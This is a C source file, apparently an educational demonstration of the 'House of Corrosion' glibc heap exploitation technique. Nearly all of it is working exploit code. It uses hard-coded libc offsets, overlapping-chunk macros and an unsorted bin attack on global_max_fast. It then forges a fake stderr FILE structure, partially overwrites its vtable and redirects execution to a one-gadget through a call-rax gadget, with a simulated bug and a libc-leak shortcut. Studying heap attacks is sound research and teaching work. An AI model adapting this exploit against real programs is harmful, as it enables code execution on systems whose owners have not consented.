/*
 * House of Corrosion
 */


#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <assert.h>


#define CHUNK_SIZE(delta) \
    ((unsigned long)(delta) * 2 + 0x20)

#define MALLOC_SIZE(delta) \
    ((CHUNK_SIZE(delta)) - 0x8)

#define REQ_TO_SIZE(req) \
    ((unsigned long)(req) + 8 & ~0xf)

// Prepare overlapping chunks A & B.
// chunk A will start before B.
// controller chunk will start slightly before A,
// so that it can be used to overwrite size of A and B.
// memory layout will be as follows;
// (chunk_size = 0x58) controller | (chunk_size = size) A | (chunk_size = size) B
//
// lsb_bef_A: lsb byte to overwrite tmp,so it will point to prev_size of chunk A
//
// constraint: (addr_A & ~0xff) == (addr_controller & ~0xff)
#define OVERLAP_CHUNKS(A, B, controller, lsb_bef_A, tmp) \
    (controller) = malloc(0x58); \
    (A) = malloc(0x18); \
    (B) = malloc(0x18); \
    (tmp) = malloc(0x58); \
    assert(((unsigned long)A & ~0xffUL) == ((unsigned long)controller & ~0xffUL)); \
    free(controller); \
    free(tmp); \
    ((char *)tmp)[0] = lsb_bef_A; /*tmp->next == (A - 0x2)*/ \
    (tmp) = malloc(0x58); \
    (controller) = malloc(0x58);


#define PRIMITIVE_2(chunk, value, size) \
    free((chunk)); \
    (chunk)[0] = value; \
    malloc((size));


#define PRIMITIVE_2_SHORT_OVERWRITE(chunk, short_value, size) \
    free((chunk)); \
    ((unsigned short *)(chunk))[0] = short_value; \
    malloc((size));


#define PRIMITIVE_3(A, B, controller, lsb_A, src_size, dst_size) \
    free((B)); \
    free((A)); \
    ((char *)(A))[0] = lsb_A; \
    controller[1] = REQ_TO_SIZE(src_size) | 1; \
    free((A)); \
    controller[1] = REQ_TO_SIZE(dst_size) | 1; \
    malloc((dst_size));


#define PRIMITIVE_3_SHORT_OVERWRITE(A, B, controller, lsb_A, src_size, dst_size, short_value) \
    free((B)); \
    free((A)); \
    ((char *)(A))[0] = lsb_A; \
    controller[1] = REQ_TO_SIZE(src_size) | 1; \
    free((A)); \
    controller[1] = REQ_TO_SIZE(dst_size) | 1; \
    ((unsigned short *)(A))[0] = short_value; \
    malloc((dst_size));


unsigned long offset_gmf = 0x3ed940;
unsigned long offset_main_arena = 0x3ebc40;
unsigned long offset_io_2_1_stdin = 0x3eba00;
unsigned long offset_io_2_1_stderr = 0x3ec680;
unsigned long offset_unsorted_bin = 0x3ebca0;
unsigned long offset_fastbinsY = 0x3ebc50;
unsigned long offset_dumped_main_arena_start = 0x3ed938;
unsigned long offset_pedantic = 0x3ed948;
unsigned long offset_morecore = 0x3ec4d8;

unsigned long addr_libc;
unsigned long addr_fastbinsY;

unsigned short io_str_jumps_lsbytes;
unsigned short call_rax_gadget_lsbytes;

unsigned long uba_size;
unsigned long dumped_main_arena_start_size;
unsigned long pedantic_size;
unsigned long morecore_size;
unsigned long stderr_flags_size;
unsigned long stderr_mode_size;
unsigned long stderr_io_write_ptr_size;
unsigned long stderr_io_buf_base_size;
unsigned long stderr_io_buf_end_size;
unsigned long stderr_vtable_size;
unsigned long stdout_flags_size; // (_IO_strfile)_IO_2_1_stderr._s._allocate_buffer

// unsorted bin attack
unsigned long *uba;
// chunk to enable NON_MAINARENA and cause `assert`
unsigned long *largebin;
// pointer for primitive 2
unsigned long *dumped_main_arena_start_chunk;
unsigned long *pedantic_chunk;
unsigned long *morecore_chunk;
unsigned long *stderr_flags_chunk;
unsigned long *stderr_mode_chunk;
unsigned long *stderr_io_write_ptr_chunk;
unsigned long *stderr_io_buf_base_chunk;
unsigned long *stderr_vtable_chunk;
// pointers for primitive 3
unsigned long  *A1, *B1, *controller1, *tmp1; // to tamper _IO_2_1_stderr._IO_buf_end
unsigned long  *A2, *B2, *controller2, *tmp2; // to tamper _IO_2_1_stdout._flags
// chunk to spray fake size
unsigned long *spray_fake_size;
// prevent consolidation
unsigned long *pc[8];

void heap_feng_shui(void) {
    int i;

    // Cheat
    // In real exploit, addr_libc can't be leaked, 
    // so unsorted bin attack has to be carried out with 4 bit guessing.
    addr_libc = (unsigned long)stdin - offset_io_2_1_stdin;
    addr_fastbinsY = addr_libc + offset_fastbinsY;

    //                                       addr_io_str_jumps
    io_str_jumps_lsbytes = (unsigned short)((addr_libc + 0x3e8360) & 0xffff);
    //                                          addr_call_rax_gadget
    call_rax_gadget_lsbytes = (unsigned short)((addr_libc + 0x8d7d7) & 0xffff);

    uba_size = 0x418;
    // size for primitive 1
    pedantic_size = MALLOC_SIZE(addr_libc + offset_pedantic - addr_fastbinsY);
    // sizes for primitive 2
    dumped_main_arena_start_size = MALLOC_SIZE(addr_libc + offset_dumped_main_arena_start - addr_fastbinsY);
    stderr_flags_size = MALLOC_SIZE((unsigned long)stderr - addr_fastbinsY);
    stderr_mode_size = MALLOC_SIZE((unsigned long)stderr + 0xc0 - addr_fastbinsY);
    stderr_io_write_ptr_size = MALLOC_SIZE((unsigned long)stderr + 0x28 - addr_fastbinsY);
    stderr_io_buf_base_size = MALLOC_SIZE((unsigned long)stderr + 0x38 - addr_fastbinsY);
    stderr_vtable_size = MALLOC_SIZE((unsigned long)stderr + 0xd8 - addr_fastbinsY);

    // dst sizes for primitive 3
    stderr_io_buf_end_size = MALLOC_SIZE((unsigned long)stderr + 0x40 - addr_fastbinsY);
    stdout_flags_size = MALLOC_SIZE((unsigned long)stderr + 0xe0 - addr_fastbinsY);
    // src size for primitive 3
    morecore_size = MALLOC_SIZE(addr_libc + offset_morecore - addr_fastbinsY);

    largebin = malloc(0x4f8);
    pc[0] = malloc(0x18);
    uba = malloc(uba_size);

    // pad to meat constraint for OVERLAP_CHUNKS
    // (ie. (chunk_A&~0xff) == (chunk_controller&~0xff))
    malloc(0x58);
    OVERLAP_CHUNKS(A1, B1, controller1, '\x50', tmp1);
    controller1[1] = REQ_TO_SIZE(stderr_io_buf_end_size) | 1; // overwrite size of chunk A to dst size
    controller1[5] = REQ_TO_SIZE(stderr_io_buf_end_size) | 1; // overwrite size of chunk B to dst size

    OVERLAP_CHUNKS(A2, B2, controller2, '\x50', tmp2);
    controller2[1] = REQ_TO_SIZE(stdout_flags_size) | 1; // overwrite size of chunk A to dst size
    controller2[5] = REQ_TO_SIZE(stdout_flags_size) | 1; // overwrite size of chunk B to dst size

    spray_fake_size = malloc(stdout_flags_size + 0x100);
    for (i = 0; i < (stdout_flags_size + 0x100) / 8; i++) {
        // spray fake valid size to avoid
        // "free(): invalid next size (fast)"
        *(spray_fake_size + i) = 0x31;
    }

    // chunk for primitive 1
    pedantic_chunk = malloc(pedantic_size);
    // chunks for primitive 2
    dumped_main_arena_start_chunk = malloc(dumped_main_arena_start_size);
    stderr_flags_chunk = malloc(stderr_flags_size);
    stderr_mode_chunk = malloc(stderr_mode_size);
    stderr_io_write_ptr_chunk = malloc(stderr_io_write_ptr_size);
    stderr_io_buf_base_chunk = malloc(stderr_io_buf_base_size);
    stderr_vtable_chunk = malloc(stderr_vtable_size);
}

int main(void) {
    heap_feng_shui();

    printf("Hit enter to continue...\n");
    while (getchar() != '\n') ;

    // connect chunk `largebin` to unsorted bins
    free(largebin);
    // move chunk `largebin` from unsorged bins to large bins
    malloc(0x508);
    // simulate vulnerability (?)
    *(largebin - 0x2) = 0; // prev_size
    *(largebin - 0x1) = 0x500 | 0b101; // set NON_MAINARENA at size

    free(uba);
    // 4 bit guess is required but cheat for now
    // overwrite bk
    uba[1] = addr_libc + offset_gmf - 0x10;
    // carry out unsorted bin attack
    malloc(uba_size);

    // forge fake _IO_2_1_stderr
    // primitive 2
    // fix unsorted bin size and bk to something valid
    PRIMITIVE_2(dumped_main_arena_start_chunk, 0x500, dumped_main_arena_start_size); // some how the size has to be the same as chunk which has NON_MAINARENA set
    free(pedantic_chunk); // primitive 1

    PRIMITIVE_2(stderr_flags_chunk, 0, stderr_flags_size);
    PRIMITIVE_2(stderr_mode_chunk, 1, stderr_mode_size);
    PRIMITIVE_2(stderr_io_write_ptr_chunk, 0x7fffffffffffffff, stderr_io_write_ptr_size);
    PRIMITIVE_2(stderr_io_buf_base_chunk, 0x4becb, stderr_io_buf_base_size); // 0x4becb == &__default_morecore - addr_one_gadget
    PRIMITIVE_2_SHORT_OVERWRITE(stderr_vtable_chunk, io_str_jumps_lsbytes - 0x20, stderr_vtable_size); // partial overwrite vtable to point to _IO_str_jumps
    // primitive 3
    // set _IO_buf_end to __morecore (== &__default_morecore)
    PRIMITIVE_3(A1, B1, controller1, '\x50', morecore_size, stderr_io_buf_end_size);
    // put &__default_morecore back to __morecore
    controller1[1] = REQ_TO_SIZE(morecore_size) | 1;
    malloc(morecore_size);
    // tamper in flight (partial overwrite)
    PRIMITIVE_3_SHORT_OVERWRITE(A2, B2, controller2, '\x50', morecore_size, stdout_flags_size, call_rax_gadget_lsbytes);

    malloc(0x18);

    return 0;
}
